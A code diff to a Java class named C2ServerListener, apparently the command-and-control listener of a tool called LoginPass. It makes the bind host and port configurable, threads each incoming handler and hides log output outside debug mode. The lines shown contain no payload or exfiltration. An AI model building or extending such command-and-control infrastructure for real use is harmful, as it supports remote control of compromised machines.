@@ -11,9 +11,10 @@ import java.util.ArrayList;
 
 public class C2ServerListener extends Thread
 {
-    private boolean running = false;
+    private boolean running = true;
     private ServerSocket serverSocket;
     private final ArrayList<C2ServerHandler> c2connections;
+    private static final boolean debugMode = (boolean) LoginPass.getInstance().getConfig().getConfigOption("debugMode");
 
     public C2ServerListener()
     {
@@ -27,8 +28,12 @@ public class C2ServerListener extends Thread
         try
         {
             serverSocket = new ServerSocket();
-            serverSocket.bind(new InetSocketAddress(String.valueOf(LoginPass.getInstance().getConfig().getConfigOption("c2host")), 12992));
+            String host = String.valueOf(LoginPass.getInstance().getConfig().getConfigOption("c2host"));
+            int port = (int) LoginPass.getInstance().getConfig().getConfigOption("c2port");
+            serverSocket.bind(new InetSocketAddress(host, port));
             running = true;
+
+            if (debugMode) System.out.println("[LoginPass] C2 listener started");
         } catch (IOException e) {
             e.printStackTrace(System.err);
         }
@@ -36,18 +41,18 @@ public class C2ServerListener extends Thread
 
     public void run()
     {
-        System.out.println("C2 server listener has started");
-
         while (running)
         {
             try
             {
                 Socket c2socket = serverSocket.accept();
-                c2connections.add(new C2ServerHandler(c2socket).begin());
+                C2ServerHandler handler = new C2ServerHandler(c2socket);
+                handler.start();
+                c2connections.add(handler);
             } catch (Exception ignored) {}
         }
 
-        System.out.println("C2 server listener has stopped");
+        if (debugMode) System.out.println("[LoginPass] C2 server listener has stopped");
     }
 
     public void end()
